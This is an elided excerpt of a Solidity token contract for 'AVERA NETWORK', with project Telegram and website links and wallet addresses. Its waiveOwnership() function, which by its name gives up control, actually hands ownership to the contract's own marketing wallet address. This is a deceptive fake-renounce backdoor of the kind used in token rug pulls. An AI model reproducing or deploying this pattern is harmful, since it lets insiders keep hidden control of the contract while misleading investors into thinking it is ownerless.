...
Telegram https://t.me/averanetwork
Website https://averanetwork.tech
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4718652f8d8Fa428e4eaC0794673583bB631b5D1);
    }
...
contract AVERANETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AVERA NETWORK";
    string private _symbol = "AVERA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4718652f8d8Fa428e4eaC0794673583bB631b5D1);
    address payable public teamWalletAddress = payable(0xec4946F531735461dbf859bb3589A295350be85D);
